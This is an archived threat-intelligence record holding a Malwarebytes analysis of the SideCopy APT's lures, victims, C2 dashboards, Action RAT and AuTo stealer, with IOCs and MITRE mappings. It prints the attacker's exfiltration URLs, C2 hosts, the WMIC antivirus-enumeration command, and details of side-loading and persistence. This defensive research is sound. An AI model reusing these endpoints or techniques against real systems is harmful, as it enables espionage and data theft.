{
    "id": "d0ff2f83-f1b8-477d-9326-dc83ddbef116",
    "created_at": "2023-01-12T15:01:06.023923Z",
    "updated_at": "2025-03-27T02:17:01.587319Z",
    "deleted_at": null,
    "sha1_hash": "9733480f514c4e3772a7f0639faee592b9bc4649",
    "title": "2021-12-02 - SideCopy APT- Connecting lures to victims, payloads to infrastructure",
    "authors": "",
    "file_creation_date": "2022-05-28T03:32:55Z",
    "file_modification_date": "2022-05-28T03:32:55Z",
    "file_size": 3549446,
    "plain_text": "# SideCopy APT: Connecting lures to victims, payloads to infrastructure\n\n**[blog.malwarebytes.com/threat-intelligence/2021/12/sidecopy-apt-connecting-lures-to-victims-payloads-to-infrastructure/](https://blog.malwarebytes.com/threat-intelligence/2021/12/sidecopy-apt-connecting-lures-to-victims-payloads-to-infrastructure/)**\n\nThreat Intelligence Team December 2, 2021\n\n_This blog post was authored by Hossein Jazi and the Threat Intelligence Team._\n\n[Last week, Facebook announced that back in August it had taken action against a Pakistani APT group known](https://about.fb.com/news/2021/11/taking-action-against-hackers-in-pakistan-and-syria/)\nas SideCopy. Facebook describes how the threat actors used romantic lures to compromise targets in\nAfghanistan.\n\nIn this blog post we are providing additional details about SideCopy that have not been published before. We\nwere able to have unique insights about victims and targeted countries as well as the kind of data the APT group\nwas able to successfully exfiltrate. Among the information that was stolen is access to government portals,\nFacebook, Twitter and Google credentials, banking information, and password-protected documents.\n\nIn addition, we detail how this threat actor had started to use new initial infection vectors for its operations which\ninclude Microsoft Publisher documents and Trojanized applications. Finally, we detail a newly-observed stealer\nthat has been used by this actor called AuTo stealer.\n\n## Newly observed lures\n\nThe SideCopy APT is a Pakistani threat actor that has been operating since at least 2019, mainly targeting\nSouth Asian countries and more specifically India and Afghanistan. Its name comes from its infection chain that\ntries to mimic that of the [SideWinder APT. It has been reported that this actor has similarities with Transparent](https://attack.mitre.org/groups/G0121/)\nTribe (APT36) and possibly is a subdivision of this actor. [Cisco Talos and](https://blog.talosintelligence.com/2021/07/sidecopy.html) [Seqrite have provided comprehensive](https://www.seqrite.com/documents/en/white-papers/Seqrite-WhitePaper-Operation-SideCopy.pdf)\nreports on this actor’s activities.\n\n\n-----\n\nThe lures used by SideCopy APT are usually archive files that have embedded one of these files: Lnk, Microsoft\nPublisher or Trojanized Applications. These lures can be categorized into two main groups:\n\nTargeted lures: These lures are specially crafted and designed to target specific victims. We believe this\ncategory is very well customized to target government or military officials. Here some of the examples:\n\n_Report-to-NSA-Mohib-Meeting-with-FR-GE-UK.zip:_\nThis archive file contains a Microsoft Publisher document that is a letter from “Mr Ahmad Shuja\nJamal, former DG for International Relations and Regional Cooperation at the National Security\nCouncil of Afghanistan” to “Hamdullah Mohib, former National Security Adviser of Afghanistan”. This\nletter is about a “meeting with representatives of France and UK delegations of Afghanistan”. Most\nlikely this lure has been used to target Afghanistan government officials and especially foreign affair\nrelated officials.\n_address-list-ere-update-sep-2021.zip: This archive file contains a malicious lnk file which loads a_\ndecoy PDF file. The decoy PDF file is: “Email facility address list of the ERE units: 20 Sept 2021”.\nThis lure seems to be used to target the Indian Army and National Cadet Corps of India.\n_NCERT-NCF-LTV-Vislzr-2022.zip: Similar to the previous one, this includes a malicious lnk that loads_\na decoy PDF file. The decoy is a curriculum of the course named “Living the values, a value-narrative\nto grass-root leadership” offered by NCERT (National Council of Educational Research and Training\nof India).\n\n\n-----\n\nFigure 1: NSA\n\n\nmeeting lure\n\n\n-----\n\nFigure 2: Email facility address list of the ERE units: 20 Sept 2021\n\n\n-----\n\nFigure 3: Living the values course\n\n\n-----\n\nGeneric lures: These lures are mostly generic and most likely have been used in spam campaigns to\ncollect emails and credentials to help the actor perform their targeted attacks. In this category we observed\n[the following: (The first three lures are the ones reported as “romantic lures” in a Facebook report)](https://about.fb.com/news/2021/11/taking-action-against-hackers-in-pakistan-and-syria/)\n\nUsing girl names as the archive file name such as “nisha.zip“: (showing girl pictures with an\napplication) These archive files contain a list of images with the “.3d” extension and an application\nnamed “3Dviewer.exe” that needs to to be executed to load and view images. In fact, the executable\nis Trojanized and will contact the actor servers to download the malicious payloads.\n“image-random number.zip“: These zip files contains a malicious lnk file that shows a girl picture as a\ndecoy.\n“Whatsapp-image-random number.zip“: These zip files contain a malicious lnk file that shows a girl\npicture as a decoy.\n“schengen_visa_application_form_english.zip“: This archive file contains a Microsoft Publisher\ndocument that loads a Schengen Visa Application Form in English as decoy. This is used to target\npeople who want to travel to European countries.\n“Download-Maria-Gul-CV.zip“: This archive contains a lnk that loads a resume as decoy. The name of\nthe archive file usually is in this pattern “Download-Name-FamilyName-CV.zip”\n“New document.zip“: This loads a document as decoy. We were not able to retrieve the lure in this\ncase.\n\nFigure 4: Schengen Visa Application Form\n\n\n-----\n\nFigure 5: 3DViewer.exe\n\n## Victimology\n\nAs previously reported, the SideCopy APT has mainly targeted defense and armed forces personnel in the\nIndian subcontinent but there are not many reports about how successful these attacks were and what data was\nexfiltrated. The Malwarebytes Threat Intelligence team was able to identify some of the successful attacks\noperated by this APT. It is worth noting that those compromises happened before the Taliban completely took\nover Afghanistan. In fact, Facebook’s intervention in August matches with the timeline of indicators we recorded.\n\nAdministration Office of the President (AOP) of Afghanistan personnel: This actor has operated targeted\nspear phishing attacks on members of AOP and was able to gain access to ten of them and steal their\ncredentials from different government services such as `mis.aop.gov.af, internal service, bank services`\n(Maiwand Bank) and personal accounts such as Google, Twitter and Facebook.\nMinistry of Foreign affairs- Afghanistan: We have evidence that the actor infected one of the members of\nthe Ministry of External affairs but it seems they were not able to collect any data from this victim.\nMinistry of Finance, Afghanistan: The actor infected two members of MOF but mostly they were able to\ncollect personal accounts such as Google and Facebook and Bank accounts\n(“worldbankgroup.csod.com”). They also exfiltrated documents that are password protected.\nAfghanistan’s National Procurement Authority (NPA): The actor infected one person in NPA and were able\nto stead personal credentials including Twitter, Facebook, Instagram, Pinterest, Google and the\n```\n   mis.aop.gov.af account.\n\n```\nA shared computer, India: It seems the actor gained access to a shared machine and collected a lot of\ncredentials from government and eduction services. It seems this machine has been infected using one of\nthe generic lures.\n\nThe SideCopy APT was able to steal several Office documents and databases associated with the Government\nof Afghanistan. As an example, the threat actor exfiltrated Diplomatic Visa and Diplomatic ID cards from the\nMinistry of Foreign Affairs of Afghanistan database, as well as the Asset Registration and Verification Authority\ndatabase belonging to the General Director of Administrative Affairs of Government of Afghanistan. They also\nwere able to exfiltrate the ID cards of several Afghani government officials.\n\n\n-----\n\nFigure 6: Asset Registration and Verification Authority database belonging to the General Director of\nAdministrative Affairs of Government of Afghanistan\nThe exfiltrated documents contain names, numbers and email addresses associated with government officials. It\nis possible that they have been already targeted by the actor or will be the future targets of this actor. There are\nalso some confidential letters that we think the actor is planning to use for future lures.\n\n## Attacker infrastructure\n\nWe have uncovered the main command and control (C2) server used by the attacker to monitor and control their\nvictims. Each archive file that is used by the attacker to send to victims is considered a unique package and\neach package has its own payloads including hta and executables that usually are hosted on compromised\ndomains. The actor has a system named “Scout” to monitor each package. The Scout system has four users\nwith English nicknames (Hendrick, Alexander, Hookes, Malone). It also defines teams that are responsible to\nmanage each package.\n\n\n-----\n\nFigure 7: Scout system\nIn this system, they have a dashboard that shows all the infected machines. Each row in the dashboard shows\none package and its statistics which includes the IP address of the victim, package name, OS version, UserAgent, browser information, country and victim status.\n\nFigure 8: Dashboard\nThe actor uses a different dashboard called Crusader to monitor the Action RAT statistics.\n\n\n-----\n\nFigure 9: Crusader\n\n## Analysis of the new attacks\n\nAs we mentioned earlier, the actor has used three different methods as its initial infection vector: lnk files,\nMicrosoft Publisher files and Trojanized application. The lnk files have been well studied and what we have\nobserved is very similar to what already has been reported, with only small changes. For example, we observed\nthat they have updated the code of hta.dll and preBotHta.dll and added some more features.\n\nIn this section we provide the analysis for the other two variants: Microsoft Publisher and Trojanized\nApplications.\n\n### Microsoft Office Publisher\n\nIn this variant, attackers have embedded a Microsoft Office Publisher document in an archive file. We’ve\nidentified two variants of the Office publisher documents:\n\nReport to NSA Mohib – Meeting with FR, GE, UK – 12 Nov 2020.docx.pub\nschengen_visa_application_form_english.pub\n\nBoth of these documents were created in August 2021 and we believe they have been used in the most recent\ncampaign. Both of these documents contains a simple macro that calls Shell function to call mshta.exe to\ndownload and execute a specified hta file.\n\nFigure 10: Embedded macros\nThe hta file loads the loader DLL (PreBotHta.dll) into memory and then collects AV product names. The AV\nname along with the encoded payloads that need to be loaded by this loader are passed to the `PinkAgain`\nfunction.\n\n\n-----\n\nFigure 11: HTA file\nThe loader is responsible for dropping both `credwiz.exe and` `Duser.dll . Unlike what has been reported, in`\nthis case `Duser.dll` is not copied into different locations based on AV products and it is copied into\n```\nC:\\ProgramData\\ShareIt for all AV products.\n\n```\nFigure 12: Loader dll\nThis loader just does some additional work based on the AV product. For example if the AV product is Avira it\ntries to download and execute an additional hta file to deploy additional payloads.\n\n\n-----\n\nFigure 13: Additional payload execution based on the AV type\nAfter dropping the required files onto the victim, it starts the “credwiz.exe” process. This executable sideloads\nthe malicious payload “Duser.dll”. This payload has been written in Delphi (this is the Delphi variant of Action\nRat) and compiled on October 2 2021.\n\nAll the commands, strings and domains in this RAT are base64 encoded. The malicious process starts by\ncollecting hostname, username, OS version, OS architecture, Mac address and installed AV products (by\nexecuting `cmd.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path`\n```\nAntiVirusProduct Get displayName /Format:List ) from the victim and sending them to the command and\n\n```\ncontrol server using a HTTP request ( \"https://afrepublic.xyz/classification/classification.php\" ).\n\nIt then goes into a loop and waits for commands from the server to execute them. This RAT has the capability to\nexecute one of the following commands:\n\nCommand: Execute commands received from the server\nDownload: Download additional payloads\nDrives: Get drive info\nGetFiles: Get files info\nExecute: Execute a specified payload using CreateProcessW\nUpload: Upload files to server\n\n\n-----\n\nFigure 14:\n\nCommands\nAfter execution of each command it reports back the result to its server. The reporting url is different than the C2\nurl. The report type depends on the command, for example if the payload executes a command, it reports the\nfollowing information to the server: Victim’s ID, the executed command, the command output and the error\nmessage if the command execution was not successful.\n\n### Trojanized Image Viewer Application (3DViewer.exe)\n\nIn this variant, the attacker has distributed an archive file including an application named `3Dviewer.exe and a`\nset of images with “ 3d ” extension that can be only opened by that executable.\n\nIt seems the attacker Trojanized an image viewer application named “3Dviewer” to download and execute a\nmalicious HTA file using Mshta in addition to its normal function that can load and show the pictures. This\nexecutable has been compiled on October 26 2021. The rest of the process is similar to what we described in\nthe previous section.\n\n\n-----\n\nFigure 15: 3DViewer.exe\n\n## AuTo Stealer\n\nWe also came across another Stealer used by this actor that has been written in C++. To the best of our\nknowledge this is a new Stealer used by SideCopy APT. A Loader has been used to drop and load an\nexecutable ( credbiz.exe ) that side loads the Stealer. We were able to identify two different variants of this\nLoader that have been used to load an HTTP version and TCP version of the Stealer. Both of these loaders and\nthe Stealer components have been compiled on October 30 2021:\n\n### Loader\n\nBased on the functionality, we can say this Loader is a C++ variant of `PreBotHta.dll (C# Loader used to load`\nother Rats used by this actor). This Loader is responsible for dropping the following files in\n```\nC:\\ProgramData\\Oracle\\ directory:\n\n```\n`credwiz.exe` executable and rename it as `credbiz.exe .`\n```\n   TextShaping.dll (Stealer component that will be side loaded by credbiz.exe )\n\n```\n\n-----\n\nFigure 16: Drop credbiz and TextShaping\nSimilar to `PreBotHta.Dll, it checks the installed AV product on the victim’s machine and performs additional`\nactions based on the AV product name. For example if the AV is Avast, Avira, BitDefender or AVG it creates a\nbatch file ( sysboot.bat ) and executes it by calling `cmd.exe . This makes` `credbiz.exe persistence through`\nthe AutoRun registry key. If the installed AV is one of the Kaspersky, Symantec, Mcafee or QuickHeal it creates\nan lnk file ( Win Setting Loader.lnk ) for persistency in StartUp directory.\n\nAfter performing the additional process, it executes `credbiz.exe by calling` `CreateProcessW .`\n\n\n-----\n\nFigure 17:\n\nAdditional functionality based of AV product\n\n### TextShaping.dll (Stealer component)\n\nThe actor used two different variants of the Stealer Stealer: HTTP and TCP. The HTTP version performs the\nexfiltration over HTTP while the TCP variant performs all the exfiltration over TCP. This component also has an\ninteresting unique PDB path: `\"D:\\Project Alpha\\HTTP Auto\\app\\Release\\app.pdb\"`\n\nThis Stealer collects PowerPoint, Word, Excel and PDF documents, text files, database files and images and\nexfiltrates them to its server over HTTP or TCP. To exfiltrate the data using HTTP, it builds a request that is\nspecific to data files being exfiltrated and sends them over an HTTP server. For example, when it wants to\nexfiltrate PowerPoint documents it builds the following request and sends them over HTTP:\n\n```\nhttp://newsroom247.xyz:8080/streamppt?HostName_UserName\n\n```\n\n-----\n\nFigure 18: Stealer\n\nFor other file types it adds the /stream related to the file type and exfiltrates them to server. Here are the list\nof them: `/streamppt, /streamdoc, /streamxls, /streamdb, /streamtxt, /streampdf, /streamimg .`\n\nBefore starting the stealing process, it collects the victim’s information including username, hostname, OS info\nand AV products and sends them to its server by adding “ user_details ” to the domain. Also, it collects file\ninformation from the victim’s machine and stores it in a file “ Hostname_UserName.txt ” and sends the file by\nusing the “ logs_receiver ” command.\n\n## Conclusion\n\nThe SideCopy APT has been actively targeting government and military officials in South Asia. The group mainly\nuses archived files to target victims in spam or spear phishing campaigns. The archive files usually have an\nembedded lnk, Office or Trojanized application that are used to call mshta to download and execute an hta file.\nThe hta files perform fileless payload execution to deploy one of the RATs associated with this actor such as\nAllaKore or Action Rat. Malwarebytes products can identify the initial infection vectors used by SideCopy and\nblock them from execution.\n\n\n-----\n\n## IOCs\n\n**Name** **IOC** **Type** **Description**\n\n\nReport-to-NSA-Mohib-Meeting-with-FR-GEUK.zip\n\n\n4E26CCAD3FC762EC869F7930A8457E4D MD5\n\n\nschengen_visa_application_form_english.zip C2831369728B7247193E2DB567900ABE MD5\n\nnew document.zip 689B9FDBF35B8CEFC266A92D1D05A814 MD5\n\nImage-8765.zip D52021F350C9C2F8EE87D3B9C070704A MD5\n\nImage-8853.zip D99491117D3D96DA7D01597929BE6C8E MD5\n\n479_1000.zip 7C0A49F3B4A012BADE8404A3BE353A48 MD5\n\nMuniba.zip A65D3AB8618E7965B9AE4FAE558EB8F2 MD5\n\nnisha.zip 48C165124E151AA2A1F4909E0B34E99C MD5\n\n\n-----\n\nWhatsapp-Image-7569.zip 0023A30B3F91FA9989E0843BBEB67CC1 MD5\n\nDownload-Maria-Gul-CV.zip 5044027CCB27401B06515F0912EB534A MD5\n\nDP_TCP.exe ec87ddad01869b58c4c0760a6a7d98f8 MD5 AuTo\nStealer\n\nDP_HTTP.exe e246728aa4679051ed20355ae862b7ef MD5 AuTo\nStealer\n\nTextShaping.dll c598a8406e2b9ec599ab9e6ec4e7d7c2 MD5 AuTo\nStealer\n\nTextShaping.dll 5f49c816d7d2b6fa274041055cc88ba7 MD5 AuTo\nStealer\n\nPayloads\n\n**Domain/IP** **Description**\n\nafrepublic.xyz C2\n\nnewsroom247.xyz C2\n\nafghannewsnetwork.com C2\n\nmaajankidevisevasansthan.org Host payloads\n\namsss.in Host payloads\n\nscouttable.xyz C2\n\nsecuredesk.one C2\n\neurekawatersolution.com Host payloads\n\nrepublicofaf.xyz C2\n\nsecurecheker.in Host payloads\n\nappsstore.in C2\n\nscout.fontsplugins.com C2\n\n144.126.141.41 C2\n\nC2s and Payloads Hosts\n\n## Mitre attack techniques\n\n**Tactic** **id** **Name** **Details**\n\nPhishing T1566.001 Spear phishing Attachment Distribute archive file as an\nspear phishing attachment\n\nExecution T1047 Windows Management Instrumentation Uses WMIC.EXE to obtain a\nsystem information\n\nUses WMIC.EXE to obtain a list\nof AntiViruses\n\n\n-----\n\nExecution T1059.003 Command and Scripting\nInterpreter: Windows Command Shell\n\nExecution T1204.001 User Execution: Malicious Link\n\nExecution T1204.002 User Execution: Malicious File\n\npersistence T1547.001 Boot or Logon Autostart\nExecution: Registry Run Keys / Startup\nFolder\n\n\nStarts CMD.EXE for commands\nexecution\n\n\nDiscovery T1012 Query Registry Reads the computer name\n\nDiscovery T1082 System information discovery\n\n\nDiscovery T1518.001 Software Discovery: Security Software\nDiscovery\n\n\nUses WMIC.EXE to obtain a list\nof AntiViruses\n\n\nDefense\nEvasion\n\nDefense\nEvasion\n\nDefense\nEvasion\n\n\nT1218.005 Signed binary proxy execution: mshta Starts MSHTA.EXE for opening\nHTA or HTMLS files\n\nT1140 Deobfuscate/Decode Files or Information Uses base64 decodes to\ndecode C2s\n\nT1574.002 Hijack Execution Flow: DLL Side-Loading Uses credwiz.exe to side load\nits malicious payloads\n\n\nCollection T1119 Automated Collection Collects db files, docs and pdfs\nautomatically\n\nCollection T1005 Data from Local System\n\n\nCommand\nand Control\n\nCommand\nand Control\n\n\nT1071.001 Application Layer Protocol: Web Protocols\n\nT1071.002 Application Layer Protocol: File Transfer\nProtocols\n\n\nExfiltration T1041 Exfiltration Over C2 Channel\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-02 - SideCopy APT- Connecting lures to victims, payloads to infrastructure.pdf"
    ],
    "report_names": [
        "2021-12-02 - SideCopy APT- Connecting lures to victims, payloads to infrastructure.pdf"
    ],
    "threat_actors": [
        {
            "id": "b584b10a-7d54-4d05-9e21-b223563df7b8",
            "created_at": "2022-10-25T16:07:24.181589Z",
            "updated_at": "2025-03-27T02:02:10.134233Z",
            "deleted_at": null,
            "main_name": "SideCopy",
            "aliases": [],
            "source_name": "ETDA:SideCopy",
            "tools": [
                "ActionRAT",
                "AllaKore",
                "Allakore RAT",
                "AresRAT",
                "Bladabindi",
                "CetaRAT",
                "DetaRAT",
                "EpicenterRAT",
                "Jorik",
                "Lilith",
                "Lilith RAT",
                "MargulasRAT",
                "ReverseRAT",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6b9fc913-06c6-4432-8c58-86a3ac614564",
            "created_at": "2022-10-25T16:07:24.185236Z",
            "updated_at": "2025-03-27T02:02:10.135195Z",
            "deleted_at": null,
            "main_name": "SideWinder",
            "aliases": [
                "APT-C-17",
                "APT-Q-39",
                "BabyElephant",
                "GroupA21",
                "HN2",
                "Hardcore Nationalist",
                "Rattlesnake",
                "Razor Tiger",
                "SideWinder",
                "T-APT-04"
            ],
            "source_name": "ETDA:SideWinder",
            "tools": [
                "BroStealer",
                "Capriccio RAT",
                "callCam"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "187a0668-a968-4cf0-8bfd-4bc97c02f6dc",
            "created_at": "2022-10-27T08:27:12.955905Z",
            "updated_at": "2025-03-27T02:00:55.41311Z",
            "deleted_at": null,
            "main_name": "SideCopy",
            "aliases": [
                "SideCopy"
            ],
            "source_name": "MITRE:SideCopy",
            "tools": [
                "AuTo Stealer",
                "Action RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "fce5181c-7aab-400f-bd03-9db9e791da04",
            "created_at": "2022-10-25T15:50:23.759799Z",
            "updated_at": "2025-03-27T02:00:55.540135Z",
            "deleted_at": null,
            "main_name": "Transparent Tribe",
            "aliases": [
                "Transparent Tribe",
                "COPPER FIELDSTONE",
                "APT36",
                "Mythic Leopard",
                "ProjectM"
            ],
            "source_name": "MITRE:Transparent Tribe",
            "tools": [
                "DarkComet",
                "ObliqueRAT",
                "njRAT",
                "Peppy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c68fa27f-e8d9-4932-856b-467ccfe39997",
            "created_at": "2023-01-06T13:46:38.450585Z",
            "updated_at": "2025-03-27T02:00:02.836543Z",
            "deleted_at": null,
            "main_name": "Operation C-Major",
            "aliases": [
                "C-Major",
                "Transparent Tribe",
                "Mythic Leopard",
                "ProjectM",
                "APT 36",
                "TMP.Lapis",
                "Green Havildar",
                "COPPER FIELDSTONE",
                "APT36",
                "Earth Karkaddan",
                "Storm-0156"
            ],
            "source_name": "MISPGALAXY:Operation C-Major",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "66fc98f4-8978-401e-9b73-81c3d5f1e44c",
            "created_at": "2024-05-01T02:03:08.050109Z",
            "updated_at": "2025-03-27T02:05:17.327953Z",
            "deleted_at": null,
            "main_name": "COPPER FIELDSTONE",
            "aliases": [
                "Gorgon Group",
                "Green Havildar ",
                "Mythic Leopard ",
                "Operation C-Major ",
                "Operation Transparent Tribe ",
                "Pasty Draco ",
                "ProjectM ",
                "Storm-0156 ",
                "APT36 "
            ],
            "source_name": "Secureworks:COPPER FIELDSTONE",
            "tools": [
                " DarkComet",
                " LuminosityLink",
                " Peppy",
                " njRAT",
                "Crimson RAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "173f1641-36e3-4bce-9834-c5372468b4f7",
            "created_at": "2022-10-25T15:50:23.349637Z",
            "updated_at": "2025-03-27T02:00:55.450857Z",
            "deleted_at": null,
            "main_name": "Sidewinder",
            "aliases": [
                "Sidewinder",
                "T-APT-04"
            ],
            "source_name": "MITRE:Sidewinder",
            "tools": [
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d0c0a5ea-3066-42a5-846c-b13527f64a3e",
            "created_at": "2023-01-06T13:46:39.080551Z",
            "updated_at": "2025-03-27T02:00:02.992026Z",
            "deleted_at": null,
            "main_name": "RAZOR TIGER",
            "aliases": [
                "SideWinder",
                "APT-C-17",
                "T-APT-04"
            ],
            "source_name": "MISPGALAXY:RAZOR TIGER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "abb24b7b-6baa-4070-9a2b-aa59091097d1",
            "created_at": "2022-10-25T16:07:24.339942Z",
            "updated_at": "2025-03-27T02:02:10.179404Z",
            "deleted_at": null,
            "main_name": "Transparent Tribe",
            "aliases": [
                "APT 36",
                "APT-C-56",
                "Copper Fieldstone",
                "Earth Karkaddan",
                "Green Havildar",
                "Mythic Leopard",
                "Operation C-Major",
                "Operation Honey Trap",
                "Operation Transparent Tribe",
                "ProjectM",
                "STEPPY-KAVACH",
                "Storm-0156",
                "TEMP.Lapis",
                "Transparent Tribe"
            ],
            "source_name": "ETDA:Transparent Tribe",
            "tools": [
                "Amphibeon",
                "Android RAT",
                "Bezigate",
                "Bladabindi",
                "Bozok",
                "Bozok RAT",
                "BreachRAT",
                "Breut",
                "CapraRAT",
                "CinaRAT",
                "Crimson RAT",
                "DarkComet",
                "DarkKomet",
                "ElizaRAT",
                "FYNLOS",
                "Fynloski",
                "Jorik",
                "Krademok",
                "Limepad",
                "Luminosity RAT",
                "LuminosityLink",
                "MSIL",
                "MSIL/Crimson",
                "Mobzsar",
                "MumbaiDown",
                "Oblique RAT",
                "ObliqueRAT",
                "Peppy RAT",
                "Peppy Trojan",
                "Quasar RAT",
                "QuasarRAT",
                "SEEDOOR",
                "Scarimson",
                "SilentCMD",
                "Stealth Mango",
                "UPDATESEE",
                "USBWorm",
                "Waizsar RAT",
                "Yggdrasil",
                "beendoor",
                "klovbot",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a4f0e383-f447-4cd6-80e3-ffc073ed4e00",
            "created_at": "2023-01-06T13:46:39.30167Z",
            "updated_at": "2025-03-27T02:00:03.045082Z",
            "deleted_at": null,
            "main_name": "SideCopy",
            "aliases": [],
            "source_name": "MISPGALAXY:SideCopy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535666,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1653708775,
    "ts_modification_date": 1653708775,
    "files": {
        "pdf": "https://archive.orkl.eu/9733480f514c4e3772a7f0639faee592b9bc4649.pdf",
        "text": "https://archive.orkl.eu/9733480f514c4e3772a7f0639faee592b9bc4649.txt",
        "img": "https://archive.orkl.eu/9733480f514c4e3772a7f0639faee592b9bc4649.jpg"
    }
}